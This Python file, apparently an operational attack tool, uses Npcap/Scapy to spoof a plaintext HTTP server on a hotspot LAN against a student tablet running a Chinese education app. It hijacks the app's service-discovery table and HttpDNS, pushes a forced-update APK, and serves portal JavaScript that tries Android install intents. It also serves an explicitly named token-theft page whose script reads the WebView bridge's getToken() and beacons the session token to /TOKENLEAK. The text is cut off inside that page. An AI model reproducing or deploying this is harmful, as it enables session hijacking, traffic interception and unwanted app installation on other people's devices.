# -*- coding: utf-8 -*-
"""npcap_http80.py -- 链路层冒充明文 HTTP 服务器, 专治端侧"连通性自检"死循环

为什么关键(实测 2026-10-04):
  真机每几秒就 GET http://<ip>/data/wifi.html (Host: www.zjxhedu.com), 180s 内 43 次;
  但真服务器现在返回 403 Forbidden, 正文既无"连接成功！"也无"浙江学海教育科技有限公司"。
  按 wifimanager LinkActivity 的判定, 端侧判 isConnect=false -> 反复轮询, **不进入业务**,
  于是推送子系统从不初始化, PBS 永不连接(3200 通道却正常 -> app 本身在跑)。
  即: 交付链被前置的连通性自检卡死, 而非被 TLS 挡住。

  该请求是**明文 HTTP 且真服务器慢约 1 秒**(抓包 SYN 与 SYNACK 相隔 1s),
  故用 Npcap 链路层伪造源抢答必胜; 即便真服务器随后发 RST 撕链也无妨 ——
  端侧在毫秒级已拿到 200 并完成判定。

用法: python npcap_http80.py [watch_seconds]
"""
import base64
import json
import os
import random
import re
import subprocess
import sys
import threading
import time
import datetime

import warnings
warnings.filterwarnings("ignore")
from scapy.all import Ether, IP, TCP, Raw, conf, AsyncSniffer
from scapy.arch.windows import get_windows_if_list

# === PAD-AUTODETECT (patch_pad_ip.py): 按 MAC 找平板当前 IP, 免受 DHCP 换址影响 ===
_PAD_MAC = "80:20:fd:8b:4b:fa"
_pad_cache = {"ip": None, "t": 0.0}


def _p200_ip():
    import time as _t
    import subprocess as _sp
    import re as _re
    now = _t.time()
    if _pad_cache["ip"] and now - _pad_cache["t"] < 15:
        return _pad_cache["ip"]
    want = _PAD_MAC.replace(":", "-").lower()
    try:
        out = _sp.check_output(["arp", "-a"], creationflags=0x08000000).decode("utf-8", "replace")
        for line in out.splitlines():
            if want in line.lower():
                m = _re.search(r"(192\.168\.137\.\d+)", line)
                if m:
                    _pad_cache["ip"] = m.group(1)
                    _pad_cache["t"] = now
                    return m.group(1)
    except Exception:
        pass
    _pad_cache["ip"] = _pad_cache["ip"] or "192.168.137.154"
    _pad_cache["t"] = now
    return _pad_cache["ip"]
# === /PAD-AUTODETECT ===


PAD_MAC = "80:20:fd:8b:4b:fa"
ICS_MAC = "52:bb:b5:4f:7f:3e"
IFINDEX = 12
PORT = 80
WATCH = int(sys.argv[1]) if len(sys.argv) > 1 else 86400
BASE = os.path.dirname(os.path.abspath(__file__))
LOG = os.path.join(BASE, "npcap_http80.log")

# 自检成功页(必须同时含"连接成功！"与"浙江学海教育科技有限公司")
PAGE_CANDIDATES = [
    os.path.join(os.path.dirname(BASE), "portal", "wifi_success.html"),
    os.path.join(BASE, "wifi_success.html"),
]

_sock = None
_lock = threading.Lock()
flows = {}
stat = {"syn": 0, "est": 0, "req": 0, "resp": 0, "paths": {}, "dst": {}}


def _detect_pad(mac=PAD_MAC):
    want = mac.replace(":", "-").lower()
    try:
        out = subprocess.check_output(["arp", "-a"], creationflags=0x08000000).decode("utf-8", "replace")
        for line in out.splitlines():
            if want in line.lower():
                m = re.search(r"(192\.168\.137\.\d+)", line)
                if m:
                    return m.group(1)
    except Exception:
        pass
    return _p200_ip()


PAD = _detect_pad()
_pad_ttl = {"t": 0.0}


def pad_now():
    global PAD
    if time.time() - _pad_ttl["t"] > 20:
        _pad_ttl["t"] = time.time()
        new = _detect_pad()
        if new != PAD:
            wlog("PAD 漂移: %s -> %s" % (PAD, new))
            PAD = new
    return PAD


def wlog(s):
    line = "%s %s" % (datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3], s)
    try:
        with open(LOG, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except OSError:
        pass
    try:
        print(line, flush=True)
    except Exception:
        pass


def iface_name():
    # PATCH-IFACE (2026-10-10): 优先按热点网卡 GUID 解析。
    #   热点重建后 ifIndex 会变(12->13), GUID 不变; 写死 index 会绑到错误网卡 -> 流量全丢。
    _want = "{6E5C648D-1355-4F48-B5BA-047951DDDFA3}".lower()
    try:
        _lst = get_windows_if_list()
    except Exception:
        _lst = []
    for d in _lst:
        if str(d.get("guid", "")).lower() == _want:
            return r"\Device\NPF_" + d["guid"]
    for d in _lst:
        nm = (str(d.get("name", "")) + " " + str(d.get("description", ""))).lower()
        if "wi-fi direct" in nm or "local area connection*" in nm:
            return r"\Device\NPF_" + d["guid"]
    for d in _lst:
        if d.get("index") == IFINDEX:
            return r"\Device\NPF_" + d["guid"]


def load_page():
    for p in PAGE_CANDIDATES:
        try:
            with open(p, "rb") as f:
                return f.read(), p
        except OSError:
            continue
    body = ("<html><head><title>公司简介-浙江学海教育科技有限公司</title></head><body>"
            "连接成功！ 浙江学海教育科技有限公司</body></html>").encode("utf-8")
    return body, "<builtin>"


BODY, BODY_SRC = load_page()

# ---- 明文服务发现劫持: 把 6 类 serverType 全部改指本机明文面 ----
# 无论端侧怎么解析 ms.yunzuoye.net (HttpDNS 被我们接管 / 或系统 DNS 解析到真机 IP),
# 只要它的明文请求走 80 端口, 就由本应答器接管并下发这张表;
# 之后 CONTROL/BIG_DATA/PUSH/LAUNCHER/FILE_BOX 的基址全部变成
# http://192.168.137.1:8000 (本机自有地址, 本地投递), assist 链随之全程明文。
MICRO_TYPES = ("SA103001", "SB103001", "SB103007", "SB103008", "SB103009", "SB103010",
               "SB103011", "SB103012", "SB103021",
               "SA106003", "SB101001", "SB103019", "SB103018", "SB103015", "SB103013",
               # ★ 2026-10-07 用【真实服务表】(real_micro_table.json) 校准补入:
               #   SB103017 / SB103020 = 47.99.214.197|47.99.229.40 : **8889**  ← 设备实测连过的 IM/教室服务
               #   SB103016 = 192.168.5.70:8080 (文件服务) ; SB103027 = /XHFileServer (文件服务)
               #   补入并指向本机 8889 ⇒ 端侧教室/IM 连接会落到我们的 fake_classroom(正在 8889 监听)
               #   —— 这很可能就是"伪教室一直没人连"的根因(此前从未声明这两个类型)。
               "SB103016", "SB103017", "SB103020", "SB103027",
               "WEB002011", "WEB113001", "WEB113002", "WEB113003")
OUR_IP = "192.168.137.1"
APK_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "agent.apk")
OUR_PORT = 8000
WEB_PORT = 80
# ★ 真实表里的端口必须照搬(端侧 getUrl() 会把 port 拼进地址)：
#   SB103017/SB103020=8889(IM/教室) SB103016=8080(文件服务) SB103027=0(走 dirLocation)
TYPE_PORT_OVERRIDE = {
    "SB103017": 8889,
    "SB103020": 8889,
    "SB103016": 8080,
}

# ★ 智通课堂(com.xh.smartclassstu) 的 WebView 内容服务 serverType:
#   BaseWebViewActivity.smali:928  getActualIp("WEB002011")  -> :894 webView.loadUrl(url)
#   (同样见 ResourcePreViewActivity:145 / YZYStudyReportActivity:171 / AiAssistantWebActivity:534)
#   BaseMicroServer$ServerUrlUnify.getUrl() 对该 JSON 字段**不做任何 scheme 校验**。
#   而该 WebView 注册的 JS 桥名为 "webView", 暴露:
#       getToken() -> "Bearer " + CPVDUser.getAccessToken()      <-- 会话令牌
#       getMyUserId() / getClassInfo() / getClassroomId() / getCurrentCourse()
#       getAuthLogin() / getBaseUrl() / getVersionName() ...
#   => 把这些 serverType 指向本机 80 端口(L2 冒充器可任意供页面) 即可在应用内
#      执行我们的 JS, 读取 window.webView.getToken() 并回传 = 账号会话接管。
WEB_TYPES = ("WEB002011", "WEB113001", "WEB113002", "WEB113003")

REAL_HOST_TYPES = {
    "SA103001": "cloudwk.yunzuoye.net",
    "SB103001": "common.yunzuoye.net",
    "SB103007": "question.yunzuoye.net",
    "SB103008": "package.yunzuoye.net",
    "SB103009": "questionpblsh.yunzuoye.net",
    "SB103010": "wrong.yunzuoye.net",
    "SB103011": "resmgmt.yunzuoye.net",
    "SB103012": "questionstatic.yunzuoye.net",
    "SB103021": "isdc.yunzuoye.net",
}


def _port_for(t):
    if t in TYPE_PORT_OVERRIDE:
        return TYPE_PORT_OVERRIDE[t]
    return WEB_PORT if t in WEB_TYPES else OUR_PORT


MICRO_BASE = "http://%s:%d" % (OUR_IP, OUR_PORT)

# 【必须精确匹配端侧 BaseMicroServer.MicroServerEntityUnify.getUrl() 的拼装规则】
#   if (port > 0)  url = domainOrIp + ":" + port
#   if (dirLocation 非空) url += "/" + dirLocation
#   if (url 含 "://" 或 protocol == NONE) **原样返回, 不加协议头**
#
# 由此推出两个此前真实存在的错误:
#   v1: 我们把 domainOrIp 写成 "http://192.168.137.1:8000" 且 port=8000
#       -> 拼成 "http://192.168.137.1:8000:8000"  (端口重复, 必然连不上)
#       正解: domainOrIp="http://192.168.137.1"(自带协议头) + port=8000
#   v2: 我们把 protocol 写成 "NONE" -> getUrl() 直接返回 "192.168.137.1:8000" (无协议头)
#       正解: protocol="HTTP" + addressType="IP" + domainOrIp="192.168.137.1" + port=8000
#       -> "http://192.168.137.1:8000"
# mode 必须为 0: ServerUrlUnify.update() 里 mode != 0 会被当作"已关闭地址"剔除。


def _micro_host_port(t):
    if t == "SA106003":            # PROBE8099-PORT 判定实验
        return ("http://%s" % OUR_IP, 8099)
    h = REAL_HOST_TYPES.get(t)
    if h:
        return ("http://%s" % h, 80)
    return ("http://%s" % OUR_IP, _port_for(t))


# TABLE-REALFORMAT: 按真服务器实测格式构表
REAL_UPDATE_TIME = 1791291004


def _now_ver():
    """ROLLING-version (2026-10-10): updateTime 必须**递增**。
    端侧对表做版本比较: 若我们反复下发同一个 updateTime, 它会认为"无更新"而继续用旧缓存
    (于是教室/IM 仍指向旧端口 -> 修正后的表不生效)。这里返回当前时间戳, 保证每次都是"更新的表"。
    """
    try:
        import time as _t
        return int(_t.time())
    except Exception:
        return REAL_UPDATE_TIME


def _dto_real(t, i, host, port):
    # FIX-2026-10-10: mode 必须是 0! 本文件 :230 实测结论: mode != 0 会被
    #   ServerUrlUnify.update() 当作"已关闭地址"剔除 -> 端侧回退真地址。
    return {"serverId": 200600 + i, "domainOrIp": host, "port": port,
            "dirLocation": "", "serverType": t, "schList": [0],
            "mode": 0, "index": i}


# FIX-2026-10-10: ① 响应必须 <=1400B(单 TCP 段) ② mode=0 ③ 端口映射
#   教室/IM(SB103017/SB103020) 是 WebSocket 服务, 真实端口 8889 -> 指到我们的 fake_classroom
#   其余关键服务指到本机 80 = 全功能伪云(versionChange->REMOTE_ASSIST / assist tasks / PNLOGIN / APK)
PRIORITY_TYPES = ("SA106003", "SB103018", "SB103017", "SB103020",
                  "SB103016", "SB103015", "SB103019", "SB103013")
MANDATORY_TYPES = ("SB103017", "SB103020", "SB103018", "SA106003", "SB103016")
_FULL_CLOUD_PORT = 80
_CLASSROOM_TYPES = ("SB103017", "SB103020")
_CLASSROOM_PORT = 8889


def _port_for_type(t):
    return _CLASSROOM_PORT if t in _CLASSROOM_TYPES else _FULL_CLOUD_PORT


def _table_types(types, cap=7):
    out = list(MANDATORY_TYPES)
    for t in (types or []):
        if t in PRIORITY_TYPES and t not in out:
            out.append(t)
    return out[:cap]


def micro_v1(types):
    lst, n = [], 0
    for t in _table_types(types):
        n += 1
        lst.append(_dto_real(t, n, OUR_IP, _port_for_type(t)))
    return {"serverType": ",".join(types or PRIORITY_TYPES), "updateTime": _now_ver(),
            "microServerDtoList": lst}
    return {"serverType": ",".join(types), "updateTime": REAL_UPDATE_TIME,
            "microServerDtoList": lst}


def micro_v2(types):
    out, n = [], 0
    for t in _table_types(types, cap=4):
        n += 1
        out.append({"serverType": t, "schoolId": 0, "classId": 0,
                    "version": _now_ver(),
                    "microServerNewDtoList": [
                        {"serverType": t, "domainOrIp": OUR_IP,
                         "protocol": "HTTP", "addressType": "IP",
                         "port": _port_for_type(t),
                         "index": 1, "mode": 0,
                         "dirLocation": "", "schList": [0],
                         "serverId": 200600 + n}]})
    return out



def extract_types(body_text):
    """从端侧请求体里取出它自报的 serverTypes, 原样回吐 -> 类型必然完全匹配。
    v2 RESTful 请求体: {"classServers":[],"isSupportHttps":true,"schoolId":957,
                        "serverTypes":[{"serverType":"SB103019","version":...},...]}"""
    try:
        obj = json.loads(body_text)
    except Exception:
        return None
    arr = obj.get("serverTypes") if isinstance(obj, dict) else obj
    if not isinstance(arr, list):
        return None
    out = [s.get("serverType") for s in arr
           if isinstance(s, dict) and s.get("serverType")]
    return out or None


def send(frame):
    global _sock
    with _lock:
        if _sock is None:
            _sock = conf.L2socket(iface=iface_name())
        _sock.send(frame)


def emit(dst_ip, sport, dport, flags, seq, ack, payload=b""):
    pad = pad_now()
    pkt = (Ether(dst=PAD_MAC, src=ICS_MAC) /
           IP(src=dst_ip, dst=pad, ttl=64) /
           TCP(sport=sport, dport=dport, flags=flags, seq=seq, ack=ack, window=64240))
    if payload:
        pkt = pkt / Raw(payload)
    send(pkt)
    stat["resp"] += 1


DNS_IP = os.environ.get("HTTP80_DNS_IP") or "192.168.137.1"

# ★ 只把下列域名的 HttpDNS 解析劫持到本机; 其余域名一律返回真实 IP,
#   以免破坏设备正常联网(这正是"加载网页失败"的根因之一)。
#   目前只需 survey.yunzuoye.net: 设备的 WebView 在明文加载该 H5 应用
#   (响应 -> 校园通知 -> 问卷), 其内容完全由我们提供。
DNS_HIJACK = tuple(x.strip() for x in (os.environ.get("HTTP80_DNS_HIJACK") or
                                       "survey.yunzuoye.net").split(",") if x.strip())

# HTTPDNS-PATTERN-HIJACK: HttpDNS 侧的模式劫持(教室/IM/盒子类域名 -> 本机)
#   端侧用 POST /103172/d?host=<域名> 做解析; 历史上问过 ms/ztp/pptserver/logdata/xh-res 等。
#   教室/IM 服务的真实域名未知(来自云端表), 但按模式兜住: 只要像 im/bsb/basket/socket/smartclass/
#   classroom/lan-server, 就解析到本机 -> 学生端会连我们的伪教室(17 端口)。
DNS_PATTERNS = tuple(x.strip().lower() for x in
                     (os.environ.get("HTTP80_DNS_PATTERNS")
                      or "bsb,box,im.,basket,socket,smartclass,classroom,lan-").split(",") if x.strip())

SYS_PORTAL = b'<!DOCTYPE html>\n<html>\n<head>\n<meta charset="utf-8">\n<meta name="viewport" content="width=device-width,initial-scale=1">\n<title>\xe7\xbd\x91\xe7\xbb\x9c\xe8\xae\xa4\xe8\xaf\x81</title>\n<style>\n  body{font-family:-apple-system,"Segoe UI",Roboto,sans-serif;margin:0;padding:12px;background:#f0f2f5;color:#222}\n  .card{background:#fff;border-radius:12px;padding:14px;box-shadow:0 1px 4px rgba(0,0,0,.1);max-width:560px;margin:0 auto}\n  h2{margin:0 0 4px;font-size:17px;color:#1a73e8}\n  h3{margin:12px 0 5px;font-size:12.5px;color:#666;border-top:1px solid #eee;padding-top:8px}\n  .btn{display:block;width:100%;box-sizing:border-box;text-align:center;padding:9px;margin:5px 0;border-radius:8px;font-size:12.5px;font-weight:600;background:#1a73e8;color:#fff;border:0}\n  .btn.alt{background:#fff;color:#1a73e8;border:1px solid #cfd8e3}\n  .btn.r{background:#d93025}\n  .box{font-family:monospace;font-size:10.5px;color:#333;background:#fafafa;border:1px solid #eee;border-radius:6px;padding:8px;margin-top:6px;max-height:300px;overflow:auto;white-space:pre-wrap}\n</style>\n</head>\n<body>\n<div class="card">\n  <h2>\xe7\xbd\x91\xe7\xbb\x9c\xe8\xae\xa4\xe8\xaf\x81</h2>\n  <p style="margin:0 0 8px;font-size:15px;font-weight:700;color:#0b8043">\xe8\xbf\x9e\xe6\x8e\xa5\xe6\x88\x90\xe5\x8a\x9f\xef\xbc\x81</p><p style="margin:0 0 8px;font-size:11px;color:#666">\xe6\xb5\x99\xe6\xb1\x9f\xe5\xad\xa6\xe6\xb5\xb7\xe6\x95\x99\xe8\x82\xb2\xe7\xa7\x91\xe6\x8a\x80\xe6\x9c\x89\xe9\x99\x90\xe5\x85\xac\xe5\x8f\xb8</p>\n  <p id="st" style="color:#888;font-size:12px">\xe5\xb7\xb2\xe5\xb0\xb1\xe7\xbb\xaa\xef\xbc\x88\xe9\xa1\xb5\xe9\x9d\xa2\xe5\xb7\xb2\xe5\xae\x8c\xe6\x95\xb4\xe5\x8a\xa0\xe8\xbd\xbd\xef\xbc\x89</p>\n\n  <h3>A. \xe5\xae\x89\xe8\xa3\x85\xe7\xb1\xbb</h3>\n  <button class="btn r" onclick="tryInstall()">\xe2\x91\xa0 \xe6\x8b\x89\xe8\xb5\xb7\xe5\x8c\x85\xe5\xae\x89\xe8\xa3\x85\xe5\x99\xa8\xef\xbc\x88intent\xef\xbc\x89</button>\n  <button class="btn alt" onclick="tryWin(\'/update.apk\')">\xe2\x91\xa1 \xe6\x96\xb0\xe7\xaa\x97\xe5\x8f\xa3\xe6\x89\x93\xe5\xbc\x80 .apk</button>\n  <button class="btn alt" onclick="tryScheme(\'intent:#Intent;action=android.intent.action.INSTALL_PACKAGE;end\')">\xe2\x91\xa2 INSTALL_PACKAGE \xe5\x8a\xa8\xe4\xbd\x9c</button>\n\n  <h3>B. \xe8\xae\xbe\xe7\xbd\xae\xe7\xb1\xbb\xef\xbc\x88\xe5\x88\xa4\xe6\x96\xad scheme \xe6\x98\xaf\xe5\x90\xa6\xe6\x94\xbe\xe8\xa1\x8c\xef\xbc\x89</h3>\n  <button class="btn r" onclick="tryScheme(\'intent:#Intent;action=android.settings.APPLICATION_DEVELOPMENT_SETTINGS;end\')">\xe5\xbc\x80\xe5\x8f\x91\xe8\x80\x85\xe9\x80\x89\xe9\xa1\xb9\xef\xbc\x88intent\xef\xbc\x89</button>\n  <button class="btn alt" onclick="tryScheme(\'intent:#Intent;action=android.settings.SECURITY_SETTINGS;end\')">\xe5\xae\x89\xe5\x85\xa8\xe8\xae\xbe\xe7\xbd\xae</button>\n  <button class="btn alt" onclick="tryScheme(\'intent:#Intent;action=android.settings.APPLICATION_SETTINGS;end\')">\xe5\xba\x94\xe7\x94\xa8\xe8\xae\xbe\xe7\xbd\xae</button>\n\n  <h3>C. scheme \xe5\xaf\xb9\xe7\x85\xa7\xef\xbc\x88\xe5\x85\xb3\xe9\x94\xae\xe5\x88\xa4\xe5\xae\x9a\xef\xbc\x89</h3>\n  <button class="btn alt" onclick="tryScheme(\'market://details?id=com.olive.agent\')">market://</button>\n  <button class="btn alt" onclick="tryScheme(\'tel:10086\')">tel:</button>\n  <button class="btn alt" onclick="tryScheme(\'file:///sdcard/\')">file:///sdcard/</button>\n  <button class="btn alt" onclick="tryScheme(\'https://www.baidu.com\')">https \xe6\x99\xae\xe9\x80\x9a\xe8\xb7\xb3\xe8\xbd\xac\xef\xbc\x88\xe5\xaf\xb9\xe7\x85\xa7\xef\xbc\x89</button>\n\n  <h3>D. \xe5\xbc\x95\xe6\x93\x8e\xe8\x87\xaa\xe6\xa3\x80</h3>\n  <input type="file" id="f" onchange="fp(this)">\n  <button class="btn alt" onclick="document.getElementById(\'f\').click()">\xe6\x89\x93\xe5\xbc\x80\xe6\x96\x87\xe4\xbb\xb6\xe9\x80\x89\xe6\x8b\xa9\xe5\x99\xa8</button>\n  <button class="btn alt" onclick="env()">\xe5\xbc\x95\xe6\x93\x8e\xe8\x87\xaa\xe6\xa3\x80</button>\n\n  <div class="box" id="out">\xe2\x80\x94</div>\n</div>\n\n<script>\n/* \xe2\x98\x85 \xe5\x9f\x8b\xe7\x82\xb9: \xe7\x94\xa8 fetch+keepalive, \xe7\xbb\x9d\xe4\xb8\x8d\xe9\x98\xbb\xe5\xa1\x9e load; /hit \xe7\x8e\xb0\xe5\x9c\xa8\xe6\x98\xaf 204 \xe5\x8d\xb3\xe6\x97\xb6\xe8\xbf\x94\xe5\x9b\x9e */\nfunction be(tag, d){\n  var s = (typeof d === \'string\') ? d : JSON.stringify(d);\n  var url = \'/hit?ev=\' + encodeURIComponent(\'SYS-\' + tag + \'|\' + String(s).slice(0,1500));\n  try{\n    if (window.fetch) fetch(url, {keepalive:true, cache:\'no-store\'})[\'catch\'](function(){});\n    else { var i = new Image(); i.src = url; }\n  }catch(e){}\n  out(tag + \' \' + String(s).slice(0,200));\n}\nfunction out(o){\n  try{ document.getElementById(\'out\').textContent += \'\\n\' + (typeof o===\'string\'?o:JSON.stringify(o)); }catch(e){}\n}\nfunction st(t){ try{ document.getElementById(\'st\').textContent = t; }catch(e){} }\n\n/* \xe2\x98\x85 \xe4\xb8\x8d\xe8\x87\xaa\xe6\x9d\x80\xe5\xbc\x8f\xe5\xaf\xbc\xe8\x88\xaa: \xe4\xb8\xbb\xe9\xa1\xb5\xe9\x9d\xa2\xe4\xbf\x9d\xe6\x8c\x81\xe5\xad\x98\xe6\xb4\xbb, scheme \xe5\x8f\xaa\xe5\x9c\xa8\xe5\xad\x90\xe7\xaa\x97\xe5\x8f\xa3/iframe \xe9\x87\x8c\xe8\xaf\x95 */\nfunction tryScheme(uri){\n  be(\'scheme\', {uri:uri, ua:navigator.userAgent});\n  st(\'\xe5\xb7\xb2\xe5\xb0\x9d\xe8\xaf\x95: \' + uri.slice(0,40));\n  /* \xe4\xb8\xbb\xe6\x96\x87\xe6\xa1\xa3\xe7\xbb\x9d\xe4\xb8\x8d\xe5\x8a\xa8; \xe7\x94\xa8\xe4\xb8\x80\xe4\xb8\xaa\xe4\xb8\xb4\xe6\x97\xb6 iframe \xe5\xb0\x9d\xe8\xaf\x95, 3 \xe7\xa7\x92\xe5\x90\x8e\xe7\xa7\xbb\xe9\x99\xa4 */\n  try{\n    var fr = document.createElement(\'iframe\');\n    fr.style.cssText = \'width:1px;height:1px;opacity:0;position:absolute;left:-9999px\';\n    fr.src = uri;\n    document.body.appendChild(fr);\n    setTimeout(function(){ try{ fr.parentNode.removeChild(fr); }catch(e){} }, 3000);\n  }catch(e){ be(\'scheme-err\', String(e)); }\n  /* \xe5\x90\x8c\xe6\x97\xb6\xe8\xaf\x95 window.open (\xe9\x83\xa8\xe5\x88\x86 WebView \xe4\xbc\x9a\xe4\xba\xa4\xe7\xbb\x99\xe7\xb3\xbb\xe7\xbb\x9f\xe5\xa4\x84\xe7\x90\x86) */\n  try{ var w = window.open(uri, \'_blank\'); be(\'scheme-win\', String(!!w)); }catch(e){}\n  return false;\n}\n\nfunction tryWin(u){\n  be(\'win\', {u:u});\n  try{ window.open(u, \'_blank\'); }catch(e){ be(\'win-err\', String(e)); }\n  return false;\n}\n\nfunction tryInstall(){\n  be(\'install-start\', {href:location.href});\n  st(\'\xe5\xb0\x9d\xe8\xaf\x95\xe6\x8b\x89\xe8\xb5\xb7\xe5\x8c\x85\xe5\xae\x89\xe8\xa3\x85\xe5\x99\xa8\xe2\x80\xa6\');\n  var fb = encodeURIComponent(\'http://192.168.137.1/update.apk\');\n  tryScheme(\'intent:#Intent;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;S.android.intent.extra.NOT_UNKNOWN_SOURCE=true;S.browser_fallback_url=\' + fb + \';end\');\n  setTimeout(function(){ tryScheme(\'intent:#Intent;action=android.intent.action.INSTALL_PACKAGE;S.android.intent.extra.NOT_UNKNOWN_SOURCE=true;end\'); }, 1200);\n  setTimeout(function(){ tryWin(\'/update.apk\'); }, 2600);\n  return false;\n}\n\nfunction fp(el){\n  try{\n    var f = el.files && el.files[0];\n    be(\'file-picked\', {n: el.files ? el.files.length : 0, name: f ? f.name : \'\', size: f ? f.size : 0});\n    st(\'\xe9\x80\x89\xe5\x88\xb0\xe6\x96\x87\xe4\xbb\xb6: \' + (f ? f.name : \'(none)\'));\n  }catch(e){ be(\'file-err\', String(e)); }\n}\n\nfunction env(){\n  var o = { ua: navigator.userAgent, href: location.href, proto: location.protocol,\n            isX5: /X5|TBS/.test(navigator.userAgent), isWv: /;\\s*wv\\)/.test(navigator.userAgent),\n            cookieEnabled: navigator.cookieEnabled, lang: navigator.language };\n  be(\'env\', o);\n  st(\'\xe8\x87\xaa\xe6\xa3\x80\xe5\xae\x8c\xe6\x88\x90 \xe2\x80\x94 UA \xe8\xa7\x81\xe4\xb8\x8b\xe6\x96\xb9\');\n  return false;\n}\n\n/* \xe2\x98\x85 load \xe4\xb9\x8b\xe5\x90\x8e\xe6\x89\x8d\xe5\x8f\x91\xe5\x9f\x8b\xe7\x82\xb9, \xe4\xbf\x9d\xe8\xaf\x81\xe8\xbf\x9b\xe5\xba\xa6\xe6\x9d\xa1\xe5\x85\x88\xe8\xb5\xb0\xe5\xae\x8c */\nwindow.addEventListener(\'load\', function(){\n  setTimeout(function(){ env(); }, 300);\n});\n</script>\n</body>\n</html>\n'

PLATFORM_APK_CFG = (b'{"url":"http://192.168.137.1/agent.apk","checksum":"2c44a3a421a1e26fcd5405e890c583ba","versionCode":999999,"appId":"CA103001","size":1866277,"forceUpdate":true}')


EB_CRAFTED = b'{"code": 0, "msg": "ok", "data": {"questions": [{"wrongQuestionId": "WQ_LAB_0001", "questionId": "Q_LAB_0001", "questionIdsString": "Q_LAB_0001", "studentId": 2112229, "studentWorkId": "SW_LAB_0001", "workId": "W_LAB_0001", "workName": "\xe5\xae\x9e\xe9\xaa\x8c\xe9\x94\x99\xe9\xa2\x98", "subject": 1, "state": 1, "questionUserType": 1, "collectionVersion": 1, "createTime": 1791260532444, "updateTime": 1791260532444, "pictureWidth": 600, "pictureHeight": 800, "annotationUrl": "http://192.168.137.1/eb_img.png", "pictureUrl": "http://192.168.137.1/eb_img.png", "correctedUrl": "http://192.168.137.1/eb_img.png", "isExistLecture": false, "playSpeed": 1.0, "wrongCollectionIds": ["WC_LAB_1"], "tagList": [], "topicLabels": [], "proofs": "", "children": ""}], "collections": [], "lectureExists": [], "topicNext": 0}}'
EB_CATEGORY = b'{"code":0,"msg":"ok","data":[{"wrongCollectionId":"WC_LAB_1","name":"\xe5\xae\x9e\xe9\xaa\x8c","allNum":1,"state":1,"studentId":2112229,"createTime":1,"updateTime":1,"questionUserTypes":[1]}]}'

def dns_public(host, servers=("223.5.5.5", "114.114.114.114", "8.8.8.8")):
    """公共 DNS 解析(手写 DNS 报文, 完全绕过本机 hosts)。返回 IP 列表。"""
    import struct as _st
    import socket as _sk
    import random as _rd
    for srv in servers:
        try:
            tid = _rd.randint(0, 65535)
            q = _st.pack(">HHHHHH", tid, 0x0100, 1, 0, 0, 0)
            for part in host.split("."):
                q += bytes([len(part)]) + part.encode()
            q += b"\x00" + _st.pack(">HH", 1, 1)
            s = _sk.socket(_sk.AF_INET, _sk.SOCK_DGRAM)
            s.settimeout(3)
            try:
                s.sendto(q, (srv, 53))
                data, _ = s.recvfrom(2048)
            finally:
                s.close()
            an = _st.unpack(">H", data[6:8])[0]
            idx = len(q)
            ips = []
            for _i in range(an):
                while idx < len(data) and data[idx] != 0:
                    if data[idx] & 0xC0:
                        idx += 2
                        break
                    idx += data[idx] + 1
                else:
                    idx += 1
                if idx + 10 > len(data):
                    break
                rt, rc, ttl, rl = _st.unpack(">HHIH", data[idx:idx + 10])
                idx += 10
                if rt == 1 and rl == 4:
                    ips.append(".".join(str(b) for b in data[idx:idx + 4]))
                idx += rl
            if ips:
                return ips
        except Exception:
            continue
    return []




# 只冒充这些目标地址: 本机(DNS 劫持后设备直接连我们) + survey.yunzuoye.net 的真实 IP
# (该 IP 的 80 端口上只有 survey 与 Sentry; Sentry 失败无害)。
# 其它目标一律放行给真服务器 -> 设备联网恢复正常。
# 设 HTTP80_ALL_DST=1 可恢复"全目标冒充"。
ALL_DST = (os.environ.get("HTTP80_ALL_DST") or "0") == "1"
TARGET_DST = tuple(x.strip() for x in
                   (os.environ.get("HTTP80_TARGET_DST") or
                    "192.168.137.1,47.111.87.154").split(",") if x.strip())

# 1x1 占位图: 端侧按类型正常渲染, 同时证明"资源内容由我们决定"
PNG_1PX = base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA"
    "60e6kgAAAABJRU5ErkJggg==")
JPG_1PX = base64.b64decode(
    "/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRof"
    "Hh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/wAALCAABAAEBAREA/8QAFAAB"
    "AAAAAAAAAAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAD8AKp//2Q==")

# 【WebView 探针】以图片路径投递 HTML+JS: 信标回报 location / UA / 疑似 JS 桥名。
WEBVIEW_PROBE = (
    "<html><head><meta charset='utf-8'><title>x</title></head><body><h3>x</h3><script>"
    "var ks=[];try{for(var k in window){if(/js|bridge|android|app|xh|launch|native|web|sdk/i.test(k))ks.push(k);}}catch(e){}"
    "var b=new Image();"
    "b.src='http://192.168.137.1/JSBEACON?href='+encodeURIComponent(location.href)"
    "+'&ua='+encodeURIComponent(navigator.userAgent)"
    "+'&keys='+encodeURIComponent(ks.join('|'));"
    "</script></body></html>").encode("utf-8")

# ★★★ 令牌窃取页(2026-10-04) ★★★
# 智通课堂(com.xh.smartclassstu) 的 WebView 内容来自服务表里的 WEB* serverType,
# 而该 WebView 挂了 JS 桥 "webView"(BaseWebViewActivity.smali:769), 其中
#     getToken() -> "Bearer " + CPVDUser.getAccessToken()   (smali:521-551)
# 我们把 WEB002011/WEB113002 指向本机 80 端口, 于是应用会加载这个页面;
# 页面里的 JS 直接读桥, 再把结果作为图片请求回传 -> 我们拿到会话令牌。
EXPLOIT_PAGE = ("""<!DOCTYPE html><html><head><meta charset="utf-8">
<title>Loading</title></head><body>
<div style="font-family:sans-serif;padding:20px;color:#888">Loading…</div>
<script>
try{var _o=(location.protocol==='https:'?'https://www.zjxhedu.com':'http://www.zjxhedu.com');new Image().src=_o+'/TOKENLEAK?t=boot&d='+encodeURIComponent(location.href);new Image().src='/TOKENLEAK?t=bootX&d='+encodeURIComponent(location.href);}catch(e){}
try{new Image().src='http://%s/TOKENLEAK?t=boot-abs&d='+encodeURIComponent(location.href);}catch(e){}
function be(tag,obj){try{
  var s; try{s=JSON.stringify(obj);}catch(e){s=String(obj);}
